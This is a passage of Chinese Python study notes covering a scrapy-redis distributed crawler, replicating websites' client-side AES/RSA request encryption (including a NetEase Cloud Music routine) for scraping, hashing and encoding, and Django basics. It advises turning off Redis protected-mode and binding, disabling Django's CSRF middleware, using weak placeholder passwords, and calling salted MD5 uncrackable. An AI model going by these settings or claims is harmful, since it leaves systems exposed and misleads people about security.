  DUPEFILTER_CLASS = "scrapy_redis.dupefilter.RFPDupeFilter"
  SCHEDULER = "scrapy_redis.scheduler.Scheduler"
  SCHEDULER_PERSIST = True
  
  ITEM_PIPELINES = {
      'scrapy_redis.pipelines.RedisPipeline': 400,
  }
  
  # 或者使用下面的方式
  REDIS_HOST = "127.0.0.1"
  REDIS_PORT = 6379
  REDIS_PARAMS = {'password': '123456'}
  ```

+ fbs.py

  实现方式就是之前的`crawlspider`类型的爬虫

  ```python
  import scrapy
  from scrapy.linkextractors import LinkExtractor
  from scrapy.spiders import CrawlSpider, Rule
  from scrapy_redis.spiders import RedisCrawlSpider
  
  # 注意  一定要继承RedisCrawlSpider
  class FbsSpider(RedisCrawlSpider):
      name = 'fbs'
      # allowed_domains = ['www.xxx.com']
      # start_urls = ['http://www.xxx.com/']
      redis_key = 'fbsQueue'  # 使用管道名称
      link = LinkExtractor(allow=r'/political/politics/index?id=\d+')
      rules = (
          Rule(link, callback='parse_item', follow=True),
      )
  
      def parse_item(self, response):
          item = {}
          yield item
  ```

+ redis中

  + redis-windwos.conf  

    + 56行添加注释 取消绑定127.0.0.1  # bind 127.0.0.1
    + 75行  修改保护模式为no  protected-mode no

  + 启动redis

  + 队列中添加url地址

    添加：lpush fbsQueue https://wz.sun0769.com/political/index/politicsNewest

    查看：lrange fbsQueue 0 -1 

+ 运行

  scrapy crawl fbs

+ 去redis中查看存储的数据

# 十五，逆向加密模块

## 1，Python中运行JS代码

### 1.1  解决中文乱码或者报错问题

```python
import subprocess
from functools import partial
subprocess.Popen = partial(subprocess.Popen, encoding='utf-8')
import execjs
```

### 1.2 常用函数

```python
print(execjs.get().name) # 获取js代码执行环境

res = execjs.eval(js)  # 执行一段js代码

#先编译
jj = execjs.compile("""  
    function an(a, b){
        return a + b    
    }
""")
# call() 运行代码中的xxx函数. 后续的参数是xxx的参数
ret = jj.call("an", 10, 20)

#读取js文件
f = open("01.js",mode="r",encoding="utf-8")
js_code = f.read()
# 执行js代码函数
js = execjs.compile(js_code)
js.call(函数)

obj = re.compile(r"window\._INIT_STATE__ = (?P<code>.*?);",re.S) # 正则表达式
code = obj.search(js_code).group("code") #匹配正则表达式
print(type(code))  #这里的code是字符串

# execjs这个库会把运行的结果自动转化成对象
result = execjs.eval(code)# 拿到的是一个JS代码运行的结果
print(result) #是个字典，Python会自动转换成字典
print(type(result)) # dict



execjs._exceptions.ProgramError: Error: Malformed UTF-8 data
js报错了，返回的数据两端有引号或者双引号，需要去掉
```

## 2，CryptoJS加密特征

```javascript
function b(a, b) {
        var c = CryptoJS.enc.Utf8.parse(b)
          , d = CryptoJS.enc.Utf8.parse("0102030405060708")
          , e = CryptoJS.enc.Utf8.parse(a)
          , f = CryptoJS.AES.encrypt(e, c, {
            iv: d,
            mode: CryptoJS.mode.CBC
        });
        return f.toString()
    }


#转换为UTF8
CryptoJS.enc.Utf8
# 转换为base64
CryptoJS.enc.Base64
```

## 3，RAS加密特征

```python
setMaxDigits,
RSAKeyPair,
encryptedString
```

## 4，md5加密解密

```python
from hashlib import md5

obj = md5()
obj.update("alex".encode("utf-8"))
# obj.update("wusir".encode('utf-8'))  # 可以添加多个被加密的内容

bs = obj.hexdigest()
print(bs)

# 加盐
from hashlib import md5
salt = "我是盐.把我加进去就没人能破解了"

obj = md5(salt.encode("utf-8"))  # 加盐
obj.update("alex".encode("utf-8"))

bs = obj.hexdigest()
print(bs)
```

## 5，傻系列加密

sha1,sha256,sha512用法跟md5一样

```python
from hashlib import sha1, sha256
sha = sha256(b'salt')
sha.update(b'alex')
print(sha.hexdigest())
```

## 6，URLencode

```Python
from urllib.parse import quote, unquote, quote_plus, unquote_plus, urlencode

# 单独编码字符串 用 quote
wq = "米饭怎么吃"
print(quote(wq))  # %E7%B1%B3%E9%A5%AD%E6%80%8E%E4%B9%88%E5%90%83
print(quote(wq, encoding="gbk")) # %C3%D7%B7%B9%D4%F5%C3%B4%B3%D4

# 多个数据统一进行编码 用urlencode ,比如字典进行编码
dic = {
    "wq": "米饭怎么吃",
    "new_wq": "想怎么吃就怎么吃"
}

print(urlencode(dic))  # wq=%E7%B1%B3%E9%A5%AD%E6%80%8E%E4%B9%88%E5%90%83&new_wq=%E6%83%B3%E6%80%8E%E4%B9%88%E5%90%83%E5%B0%B1%E6%80%8E%E4%B9%88%E5%90%83
print(urlencode(dic, encoding="utf-8"))  # 也可以指定字符集

# 一个完整的url编码过程
base_url = "http://www.baidu.com/s?"
params = {
    "wd": "大王"
}

url = base_url + urlencode(params)
print(url)  # http://www.baidu.com/s?wd=%E5%A4%A7%E7%8E%8B

#解码
s = "http://www.baidu.com/s?wd=%E5%A4%A7%E7%8E%8B"
print(unquote(s))  # http://www.baidu.com/s?wd=大王

print(quote("a /b/c=", safe=""))  # 传递safe=""  可以保持和浏览器一致
print(quote_plus("a /b/c="))
```

## 7，base64编码

```Python
import base64

bs = "我要吃饭".encode("utf-8")
# 把字节转化成b64
print(base64.b64encode(bs).decode())

# 把b64字符串转化成字节
s = "5oiR6KaB5ZCD6aWt"
print(base64.b64decode(s).decode("utf-8"))

#base64报错问题
import base64

s = "ztKwrsTj0b0"
bb = base64.b64decode(s)
print(bb)

此时运行出现以下问题
Traceback (most recent call last):
  File "D:/PycharmProjects/rrrr.py", line 33, in <module>
    bb = base64.b64decode(s)
  File "D:\Python38\lib\base64.py", line 87, in b64decode
    return binascii.a2b_base64(s)
binascii.Error: Incorrect padding

# 解决办法

s = "ztKwrsTj0b0"
s += ("=" * (4 - len(s) % 4))
print("填充后", s)
bb = base64.b64decode(s).decode("gbk")
print(bb)

# 注意事项
由于标准的Base64编码后可能出现字符+和/，但是这两个字符在URL中就不能当做参数传递，所以就出现了Base64URL，下面是它们的区别：

1. Base64编码后出现的+和/在Base64URL会分别替换为-和_
2. Base64编码中末尾出现的=符号用于补位，这个字符和queryString中的key=value键值对会发生冲突，所以在Base64URL中=符号会被省略，去掉=后怎么解码呢？因为Base64是把3个字节变为4个字节，所以，Base64编码的长度永远是4的倍数，因此，需要加上=把Base64字符串的长度变为4的倍数，就可以正常解码了。

我们的应对方案:
在处理base64的时候.如果遇到了没有+和/的情况. 可以采用下面的方案来替换掉+和/
b64 = base64.b64decode(mi, b"-_")
```

## 8，AES加密

### 1，加密规则

#### 第一种

```Python
# AES加密
from Crypto.Cipher import AES
import base64
"""
长度
    16: *AES-128*
    24: *AES-192*
    32: *AES-256*

MODE 加密模式.常见的 
    ECB  可以没有iv
    CBC	 需要iv的
"""
# 创建加密器 注意秘钥和iv必须是16个字节
aes = AES.new( key= b"alexissbalexissb", mode=AES.MODE_CBC, iv=b"0102030405060708") # 分别是秘钥，模式，iv
data = "我吃饭了"

# 加密的内容必须是字节，所以先进行编码
data_bs = data.encode("utf-8")

# 需要加密的数据必须是16的倍数
# 填充规则: 缺少数据量的个数 * chr(缺少数据量个数)
pad_len = 16 - len(data_bs) % 16
data_bs += (pad_len * chr(pad_len)).encode("utf-8")
# 再对编码后的字节进行加密
bs = aes.encrypt(data_bs)
#用base64对结果进行编码
result = base64.b64encode(bs).decode()
```

#### 第二种，用pad对字节进行填充达到规定的长度

```Python
# AES加密
from Crypto.Cipher import AES
import base64
from Crypto.Util.Padding import pad
"""
长度
    16: *AES-128*
    24: *AES-192*
    32: *AES-256*

MODE 加密模式.常见的 
    ECB  可以没有iv
    CBC	 需要iv的
"""
# 创建加密器 注意秘钥和iv必须是16个字节
aes = AES.new( key= b"alexissbalexissb", mode=AES.MODE_CBC, iv=b"0102030405060708") # 分别是秘钥，模式，iv
data = "我吃饭了"

# 加密的内容必须是字节，所以先进行编码
data_bs = data.encode("utf-8")

# 需要加密的数据必须是16的倍数
# 用pad工具进行填充
data_bs = pad(data_bs,16)
# 再对编码后的字节进行加密
bs = aes.encrypt(data_bs)
#用base64对结果进行编码
result = base64.b64encode(bs).decode()
print(result)
```

### 2, 加密结果转换base64,hex

```python 
# 转换成base64 bs是AES加密得到的字节
result = base64.b64encode(bs).decode()

#转换成16进制
import binascii
res = binascii.b2a_hex(bs).decode()

# 也可以转换成16进制，跟上面一个效果一样
bs.hex()
```

### 3，解密规则

```python
from Crypto.Util.Padding import pad,unpad

# base64编码后的密文
s = '9noPO0fcQizMbPkXcVOTDg=='
# 创建解密器
aes = AES.new(key= b"alexissbalexissb", mode=AES.MODE_CBC, iv=b"0102030405060708")
# 首先把base64编码转换成正常的字节
data = base64.b64decode(s)
res = aes.decrypt(data)
# 明文有可能有问题，因为字节是填充过得
# 用unpad 去除填充的内容，注：需要导入unpad
res = unpad(res,16)
# 得到明文
mingwen = res.decode("utf-8")
print(mingwen)
```



## 9，DES加密

### 1，加密规则

```Python
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad,unpad
import base64
mingwen = '艾尼在学爬虫'

# DES key 是 8个字节
# iv 在CBC 模式下使用 长度8个字节
des = DES.new(key=b'aininora', mode=DES.MODE_CBC,iv=b'ainiaini')

# 明文进行编码
data = mingwen.encode('utf-8')
# 对编码后的字节进行填充
r = pad(data,8)
# 对填充后的字节进行des加密后的字节
res = des.encrypt(r)
# 对加密后的字节进行base64编码
base64_res = base64.b64encode(res).decode()
print(base64_res)
```

### 2，DES解密规则

```python
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad,unpad
import base64

#base64密文
miwen = 't4TYyzRnIkmVmI81n+cdsVQfprHN5AtG'
#转换成base64字节
base64_byt = base64.b64decode(miwen)
# 创建解密器对象
des = DES.new(key=b'aininora', mode=DES.MODE_CBC,iv=b'ainiaini')
# 进行解密
r = des.decrypt(base64_byt)
# 得到的结果去掉填充部分
data = unpad(r,8)
# 对得到的字节进行解码
mingwen = data.decode('utf-8')
print(mingwen)
```

注：DES3 与AES，DES加密，解密规则一样，都是兄弟

注：js里的秘钥可以超过8位，js默认去前八位进行解密

## 10，RSA加密

### 1，RSA生成秘钥和公钥

```Python
#生成和处理秘钥的
from Crypto.PublicKey import RSA
# 加密和解密
from Crypto.Cipher import PKCS1_v1_5

import base64

# 生成私钥
#bits = 2048 是秘钥的长度
rsa_key = RSA.generate(bits=2048)
# 把秘钥导出来
# 秘钥的本质是字节

# export_key 有个参数叫format,默认为PEM，背后的含义是把秘钥转换成了base64
key = rsa_key.export_key().decode()

with open('./rsa_miyao.pem',mode='w',encoding='utf-8') as f:
	f.write(key)


# 把format换成DER,拿到的是字节
# key = rsa_key.export_key(format='DER')

# 把字节手动转换成base64
# result = base64.b64encode(key).decode()


#生成公钥
public_key = rsa_key.public_key()
# 把公钥导出来
p_key = public_key.export_key()

with open('./rsa_gongyao.pem',mode='wb') as f:
	f.write(p_key)

```

### 2, RSA进行加密

```python
#加密解密
from Crypto.Cipher import PKCS1_v1_5
#加载key
from Crypto.PublicKey import RSA

import base64

# 导入的key可以是PEM格式的秘钥，或者是直接形式的秘钥也可以
# 读取秘钥
f = open('./rsa_gongyao.pem',mode='r',encoding='utf-8')
# 拿到已经生成好的秘钥
pub_key = f.read()
f.close()

mingwen = "我要好好学习爬虫"

rsa_key = RSA.importKey(pub_key)
# 生成加密对象
rsa = PKCS1_v1_5.new(key=rsa_key)
# 对明文进行编码，处理成字节
mingwen_bs = mingwen.encode('utf-8')
# 对明文字节进行加密,得到密文字节
mi_bs = rsa.encrypt(mingwen_bs)
# 转换成base64
base_64 = base64.b64encode(mi_bs).decode()
#rsa每次加密后的结果可能不一样
print(base_64)

# 如果用了没有填充的算法，那每一次算出来的结果固定的
# 如果同一个明文反复计算结果是一样的那么考虑用js来完成逆向工作
```

#### 2.1 第二中加密方法

```js
// JSEncrypt
// setPublicKey

// 用的是固定的第三方库，库的名字叫jsencrypt
// 但是这个库只能在浏览器环境使用
// 我们用的是Node环境，所以不能直接是哟和


// 我们需要换一个库， 名字叫 node-jsencrypt
// 安装 npm install node-jsencrypt

var {JSEncrypto} = require('node-jsencrypt')
var o = new JSEncrypt  
o.setPublicKey('xxxxxxxxxxxxxxxxxxxxxxxx')
r = o.encrypt("加密的内容")

// 可以直接把网站的内容拿过来


```

### 3，RSA特殊解密

#### 3.1 第一特征

1，如果用了没有填充的算法，那每一次算出来的结果固定的

2，如果同一个明文反复计算结果是一样的那么考虑用js来完成逆向工作

```js
// 特征：
// "010001" -> 这是16进制 -> 65537
// setMaxDigits
// RSAKeyPair
// encryptedString

const {
	setMaxDigits,
	RSAKeyPair,
	encryptedString
} = require("./Ras加密");

function c(a,b,c){
    var d,e;
    return setMaxDigits(131),
        d = new RSAKeyPair(b,"",c),
        e = encryptedString(d,a)
}
```

3，用RSA.js文件解决问题

例如：网易云案例

```js
const CryptoJS = require("crypto-js")
var window = this

const {
	setMaxDigits,
	RSAKeyPair,
	encryptedString
} = require("./Ras加密");
!function() {
    function a(a) {
        var d, e, b = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", c = "";
        for (d = 0; a > d; d += 1)
            e = Math.random() * b.length,
            e = Math.floor(e),
            c += b.charAt(e);
        return c
    }
    function b(a, b) {
        var c = CryptoJS.enc.Utf8.parse(b)
          , d = CryptoJS.enc.Utf8.parse("0102030405060708")
          , e = CryptoJS.enc.Utf8.parse(a)
          , f = CryptoJS.AES.encrypt(e, c, {
            iv: d,
            mode: CryptoJS.mode.CBC
        });
        return f.toString()
    }
    function c(a, b, c) {
        var d, e;
        return setMaxDigits(131),
        d = new RSAKeyPair(b,"",c),
        e = encryptedString(d, a)
    }
    function d(d, e, f, g) {
        var h = {}
          , i = a(16);
        return h.encText = b(d, g),
        h.encText = b(h.encText, i),
        h.encSecKey = c(i, e, f),
        h
    }
    function e(a, b, d, e) {
        var f = {};
        return f.encText = c(a + e, b, d),
        f
    }
    window.asrsea = d,
    window.ecnonasr = e
}();

    var params = {
        csrf_token: "",
        encodeType: "aac",
        ids: "[1325905146]",
        level: "standard"
    }
    var second = '010001'
    var third = '00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7'
    var forth = '0CoJUm6Qyw8W8jud'


function fn(params) {
       return window.asrsea(JSON.stringify(params),second,third,forth)
```



### 4, RSA普通解密

```python
#加密解密
from Crypto.Cipher import PKCS1_v1_5
#加载key
from Crypto.PublicKey import RSA

import base64

f = open('./rsa_miyao.pem',mode='r',encoding='utf-8')
# 拿到已经生成好的秘钥
pri_key = f.read()
f.close()
# 拿到秘钥
rsakey = RSA.importKey(pri_key)
# 生成解密器对象
rsa = PKCS1_v1_5.new(key=rsakey)
miwen = 'mmf28CJEtFU2Y6C/qx10xoaRmsiY2at3LBjHR5DFdnG9V+5sGPFaMGDGM4OBVWKKJNuSFZgGL9Y409mbh32IKRL4TZYnc0RvJH/0t38d7AmnqnHAyTRUvpKlPzzJg559md6BcTA/ZpYZ4WAtXRuysMvuPTdlRvog2ceGJDXURajU3KyzHXFA9Hc+AamVL75D+YKrOB6n9YeV7n4+DK5mqouNlLp6Plee39vYBzN0IKkzyD6RatmVVUIxJCsUJmeJgIdnBGEuRA9bGNOG3VQa7NF/syWjiRNbKYz+KZHx+RtQ9GuzmPhtJbjh8anPeR2kzNwgfD1HiKhIBDQKVQH/eA=='
#对密文进行base64解码转换成字节
base64_2bs = base64.b64decode(miwen)
#对拿到的字节进行rsa解密得到明文字节
# 解密第二个参数给个None，意思是解密时出错了返回None
mingwen_bs = rsa.decrypt(base64_2bs,None)
#对明文字节进行解码得到明文
mingwen = mingwen_bs.decode('utf-8')
print(mingwen)
```

## 11 异步框架特征

```JS
## 异步框架 ---- 固定逻辑
## next 表示下一步是哪里
## return 语句表示给下一步传递的消息
## sent是接受上一步return返回的东西
## abrupt 第一个参数是return 表示该异步逻辑，彻底结束，返回值为第二个参数；
## stop 表示彻底终结该异步框架


return d().wrap((function(e) {
                    for (; ; )  // 死循环
                        switch (e.prev = e.next) {
                        case 0: // 第一次一定执行case 0
                            return e.next = 2, // 表示下一步执行哪里（表示下一步执行case 2，返回的内容是传递给case 2)
                            me.search.getSearchSalaryList(pe(pe({}, y), {}, {
                                pageNum: f.current,
                                limit: 15
                            }));
                        case 2:
                            t = e.sent,  // 上一步return的东西，上一步返回的内容100%是promise对象
                            a = t.resdata,
                            1 == t.rescode && a && (n = a.salarys,
                            r = a.pageCount,
                            c = a.totalCountStr,
                            l = a.company,
                            s = a.recCompany,
                            x((function(e) {
                                return (0,
                                z.JO)(f.current, e, n)
                            }
                            )),
                            F(+r || 0),
                            K(c || ""),
                            Z(l || null),
                            D(s || []),
                            J(!1));
                        case 6:
                        case "end":
                            return e.stop() // 彻底停止
                        }
                }
                ), e)
```

# 十六，Django框架

## 12.1 命令行操作

```python
#  创建django项目
django-admin startproject aini

# 启动项目
cd /mysite
python3 manage.py runserver

## 创建应用
"""
Next, start your first app by running python manage.py startapp [app_label].
"""
	python manage.py startapp app01
    ## 应用名应该做到见名知意
      user
      order
      web
      ...
      ## 但是我们教学统一就用app01/02/03/04
        #有很多文件
        
  
# pycharm操作
	# 1 new project 选择左侧第二个django即可
  
  # 2 启动
  		1.还是用命令行启动
    	2.点击绿色小箭头即可

  # 3 创建应用
  		1.pycharm提供的终端直接输入完整命令
    	2.pycharm 
      		tools 
        		run manage.py task提示(前期不要用 给我背完整命令)
 # 4 修改端口号以及创建server	
		edit confi....
```

## 12.2 主要文件介绍

```python
-mysite项目文件夹
	--mysite文件夹
  	---settings.py	   ## 配置文件
    ---urls.py			## 路由与视图函数对应关系(路由层)
    ---wsgi.py			## wsgiref模块(不考虑)
  --manage.py				## django的入口文件
  --db.sqlite3			## django自带的sqlite3数据库(小型数据库 功能不是很多还有bug)
  --app01文件夹
  	---admin.py			## django后台管理
    ---apps.py			## 注册使用
    ---migrations文件夹		## 数据库迁移记录
    ---models.py		## 数据库相关的 模型类(orm)
  	---tests.py			## 测试文件
    ---views.py			## 视图函数(视图层)
```

## 12.3 应用

```Python
"""
django是一款专门用来开发app的web框架

django框架就类似于是一所大学(空壳子)
app就类似于大学里面各个学院(具体功能的app)
	比如开发淘宝
		订单相关
		用户相关
		投诉相关
		创建不同的app对应不同的功能
	
	选课系统
		学生功能
		老师功能

一个app就是一个独立的功能模块
"""
## ***********************创建的应用一定要去配置文件中注册**********************
INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'app01.apps.App01Config',  # 全写
  	'app01',			 # 简写
]
# 创建出来的的应用第一步先去配置文件中注册 其他的先不要给我干
## ps:你在用pycharm创建项目的时候 pycharm可以帮你创建一个app并且自动注册
***********************************************************************
```

## 12.4 命令行与pycharm创建的区别

```python
# 1 命令行创建不会自动有templatew文件夹 需要你自己手动创建而pycharm会自动帮你创建并且还会自动在配置文件中配置对应的路径
# pycharm创建
TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [os.path.join(BASE_DIR, 'templates')]
]
# 命令行创建
TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [],
]
"""
也就意味着你在用命令创建django项目的时候不单单需要创建templates文件夹还需要去配置文件中配置路径
'DIRS': [os.path.join(BASE_DIR, 'templates')]
```

## 12.5 django小白必会三板斧

```python
"""
HttpResponse
	返回字符串类型的数据

render
	返回html文件的

redirect
	重定向
	  return redirect('https://www.mzitu.com/')
    return redirect('/home/')
""" 
```

## 12.6 静态文件配置

### 12.6.1 static文件作用

```python
## 前段写好了的，能够直接调用使用的都称之为静态文件
    ## 网站写好的js文件
    ## 写好的css文件
    ## 网站用到的图片文件
    ## 第三方插件等等

## 需要手动创建static文件
```

### 12.6.2 static文件配置

```python
STATIC_URL = '/ooo/'  # 类似于访问静态文件的令牌
"""如果你想要访问静态文件 你就必须以static开头"""
"""
/static/bootstrap-3.3.7-dist/js/bootstrap.min.js

/static/令牌
取列表里面从上往下依次查找
    bootstrap-3.3.7-dist/js/bootstrap.min.js
    都没有才会报错
"""
# 静态文件配置（多个静态文件）
STATICFILES_DIRS = [
    os.path.join(BASE_DIR,'static'),
    os.path.join(BASE_DIR,'static1'),
    os.path.join(BASE_DIR,'static2'),
]
```

### 12.6.3 静态文件动态解析

```python
# 静态文件动态解析
    {% load static %}
    <link rel="stylesheet" href="{% static 'bootstrap-3.3.7-dist/css/bootstrap.min.css' %}">
    <script src="{% static 'bootstrap-3.3.7-dist/js/bootstrap.min.js' %}"></script>
```

### 12.6.4 form表单提交数据，及action参数

```python
    
# form表单默认是get请求数据
	http://127.0.0.1:8000/login/?username=jason&password=123
"""
form表单action参数
	1.不写 默认朝当前所在的url提交数据
	2.全写 指名道姓
	3.只写后缀 /login/
"""
```

### 12.6.5 需要配置文件组中注释掉一行代码

```python
# 在前期我们使用django提交post请求的时候 需要取配置文件中注释掉一行代码
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    # 'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]
```

## 12.7 request对象方法初识

### 12.7.1 方法

```python
request.method # 返回请求方式 并且是全大写的字符串形式  <class 'str'>
request.POST  # 获取用户post请求提交的普通数据不包含文件

request.POST.get()  # 只获取列表最后一个元素
request.POST.getlist()  # 直接将列表取出

request.GET  # 获取用户提交的get请求数据
request.GET.get()  # 只获取列表最后一个元素
request.GET.getlist()  # 直接将列表取出
"""
get请求携带的数据是有大小限制的 大概好像只有4KB左右
而post请求则没有限制
"""
```

### 12.7.2 案例

```python
  
def login(request):
    # 返回一个登陆界面
    """
    get请求和post请求应该有不同的处理机制
    :param request: 请求相关的数据对象 里面有很多简易的方法
    :return:
    """
    # print(type(request.method))  # 返回请求方式 并且是全大写的字符串形式  <class 'str'>
    # if request.method == 'GET':
    #     print('来了 老弟')
    #     return render(request,'login.html')
    # elif request.method == 'POST':
    #     return HttpResponse("收到了 宝贝")
    
    if request.method == 'POST':
        return HttpResponse("收到了 宝贝")
    return render(request, 'login.html')
```

### 12.7.3 request.POST结果

```python
request.POST ## 结果是一个字典   
## <QueryDict: {'username': ['aini'], 'password': ['123']}
## 值是列表
request.POST.get('password')   # 'password'
## 取password这个键的值列表中的最后一个值

## 如何取值列表呢
request.POST.getlist('password')  ## ['password']
```

## 12.8 django链接数据库(MySQL)

```python
# 默认用的是sqkite3
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),
    }
}

# django链接MySQL
	1.第一步配置文件中配置
  	DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'day60',
        'USER':'root',
        'PASSWORD':'admin123',
        'HOST':'127.0.0.1',
        'PORT':3306,
        'CHARSET':'utf8'
    }
}
  2.代码声明	
  	## django默认用的是mysqldb模块链接MySQL
    ## 但是该模块的兼容性不好 需要手动改为用pymysql链接
    
    ## 你需要告诉django不要用默认的mysqldb还是用pymysql
    # 在项目名下的__init__或者任意的应用名下的__init__文件中书写以下代码都可以
    import pymysql
	pymysql.install_as_MySQLdb()
```

## 12.9 Django ORM

```python
"""
ORM. 对象关系映射
作用:能够让一个不用sql语句的小白也能够通过python 面向对象的代码简单快捷的操作数据库
不足之处:封装程度太高 有时候sql语句的效率偏低 需要你自己写SQL语句

类											表

对象									记录
	
对象属性							记录某个字段对应的值

应用下面的models.py文件
"""

# 1 先去models.py中书写一个类
	class User(models.Model):
    # id int primary_key auto_increment
    id = models.AutoField(primary_key=True)
    
    # username varchar(32)
    username = models.CharField(max_length=32)
    
    # password int
    password = models.IntegerField()

*************************# 2 数据库迁移命令*************************
python3 manage.py makemigrations 
##将操作记录记录到小本本上(migrations文件夹)

python3 manage.py migrate  ## 将操作真正的同步到数据库中
# 只要你修改了models.py中跟数据库相关的代码 就必须重新执行上述的两条命令
******************************************************************

class User(models.Model):
    # id int primary_key auto_increment
    id = models.AutoField(primary_key=True,verbose_name='主键')
    # username varchar(32)
    username = models.CharField(max_length=32,verbose_name='用户名')
    """
    CharField必须要指定max_length参数 不指定会直接报错
    verbose_name该参数是所有字段都有的 就是用来对字段的解释
    """
    # password int
    password = models.IntegerField(verbose_name='密码')


class Author(models.Model):
    # 由于一张表中必须要有一个主键字段 并且一般情况下都叫id字段
    # 所以orm当你不定义主键字段的时候 orm会自动帮你创建一个名为id主键字段
    # 也就意味着 后续我们在创建模型表的时候如果主键字段名没有额外的叫法 那么主键字段可以省略不写
    # username varchar(32)
    username = models.CharField(max_length=32)
    # password int
    password = models.IntegerField()
```

### 12.9.1 字段的增删改查

```python
# 字段的增加
  1.可以在终端内直接给出默认值
  2.该字段可以为空
    info = models.CharField(max_length=32,verbose_name='个人简介',null=True)
  3.直接给字段设置默认值
    hobby = models.CharField(max_length=32,verbose_name='兴趣爱好',default='study')
 
# 字段的修改
	## 直接修改代码然后执行数据库迁移的两条命令即可！

# 字段的删(不建议)
	## 直接注释对应的字段然后执行数据库迁移的两条命令即可！
  ## 执行完毕之后字段对应的数据也都没有了
  
"""
在操作models.py的时候一定要细心
	千万不要注释一些字段
	执行迁移命令之前最好先检查一下自己写的代码
"""

# 个人建议:当你离开你的计算机之后一定要锁屏
```

### 12.9.2 数据的增删改查

```python
# 今天只会介绍一点点 后面会详细的介绍

# 查
res = models.User.objects.filter(username=username)
user_obj = models.User.objects.filter(username=username).first()
"""
返回值你先看成是列表套数据对象的格式
它也支持索引取值 切片操作 但是不支持负数索引
它也不推荐你使用索引的方式取值

"""
filter括号内可以携带多个参数 参数与参数之间默认是and关系
你可以把filter联想成where记忆



# 增
from app01 import models
res = models.User.objects.create(username=username,password=password)
# 返回值就是当前被创建的对象本身

# 第二种增加
user_obj = models.User(username=username,password=password)
user_obj.save()  # 保存数据
```

### 12.9.3 查

```python
# 查所有数据

 # 方式1
    data = models.User.objects.filter()
    print(data)
    # <QuerySet [<User: User object>, <User: User object>, <User: User object>, <User: User object>]>
 # 方式2
    user_queryset = models.User.objects.all()
    # <QuerySet [<User: User object>, <User: User object>, <User: User object>, <User: User object>]>
    # return render(request,'userlist.html',{'user_queryset':user_queryset})
    return render(request,'userlist.html',locals())
## locals() 函数可以把当前作用域中的变量传给前端
```

### 12.9.4 改

```python
## 根据id 修改数据库中的数据
password = request.POST.get('password')
username = request.POST.get('username')

## 方式1
models.User.objects.filter(id=edit_id).update(username=username,password=password)
 """
    将filter查询出来的列表中所有的对象全部更新            批量更新操作
    只修改被修改的字段
"""

## 方式2
edit_obj = models.User.objects.filter(id=user_id).first()
edit_obj.username = username
edit_obj.password = password
edit_obj.save()
"""
    上述方法当字段特别多的时候效率会非常的低
    从头到尾将数据的所有字段全部更新一边 无论该字段是否被修改
"""
```

### 12.9.5 删除

```python
  models.User.objects.filter(id=delete_id).delete()  ## 可以批量删除
```



### 12.9.6 orm创建表关系

```python
'''
表与表之间的关系
	一对多
	
	多对一
	
	一对一
'''
```

```python
from django.db import models

# Create your models here.
# 创建表关系 先将基表创建出来 然后再添加外键字段
class Book(models.Model):
	title = models.CharField(max_length=32)
	price = models.DecimalField(max_digits=8,decimal_places=2)
	## 小数总共八位，小数点后面占俩位
	'''
	外键关系：
		图书和出版社是一对多，并且书是多的一方，所以外键字段放在书表里面	
	'''
	publish = models.ForeignKey(to='Publish')
	## 还有个to_field参数，不指定的话默认就是与出版社表的主键字段做外键关联
	'''
	如果字段对应的是ForeignKey，那么会自动在字段的后面加id,如publish_id;
	如果自作聪明的加了_id,那么orm还是会给我们加_id
	'''

	'''
		图书和出版社是一对多，并且书是多的一方，所以外键字段放在书表里面
		外键字段建在任意一方即可，但是推荐你建在查询频率较高的一方	
	'''
	# authors是虚拟字段，主要是告诉orm 书籍表和作者表是多对多的关系，让orm自动帮你创建第三张关系表
	authors = models.ManyToManyField(to='Author')


class Publish(models.Model):
	name = models.CharField(max_length=32)
	addr = models.CharField(max_length=32)

class Author(models.Model):
	name = models.CharField(max_length=32)
	age = models.IntegerField()
	'''
	作者与作者详情是一对一的关系，外键字段建在任意一方都可以，但是推荐你建立在查询频率较高的一方
	'''
	author_detail = models.OneToOneField(to='AuthorDetail')
	'''
	自动给字段加_id后缀，所以不要自作聪明加_id后缀
	'''

class AuthorDetail(models.Model):
	phone = models.BigIntegerField()
	addr = models.CharField(max_length=32)


```

## 12-10 Django 请求声明周期流程图

![image-20230926190459965](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230926190459965.png)

```Python
# 扩展知识点
	"""
	缓存数据库
		提前已经将你想要的数据准备好了 你来直接拿就可以
		提高效率和响应时间
		
	当你在修改你的数据的时候 你会发现数据并不是立刻修改完成的
	而是需要经过一段时间才会修改
		博客园
	
	了解即可
"""
```

## 12-11 路由层

### 11-1 路由匹配

```python
# 路由匹配
url(r'test',views.test),
url(r'testadd',views.testadd)
"""
url方法第一个参数是正则表达式
	只要第一个参数正则表达式能够匹配到内容 那么就会立刻停止往下匹配
	直接执行对应的视图函数

你在输入url的时候会默认加斜杠
	django内部帮你做到重定向
		一次匹配不行
		url后面加斜杠再来一次
"""
# 取消自动加斜杠
APPEND_SLASH = False/True	# 默认是自动加斜杠的


urlpatterns = [
    url(r'^admin/', admin.site.urls),
    # 首页
    url(r'^$',views.home),
    # 路由匹配
    url(r'^test/$',views.test),
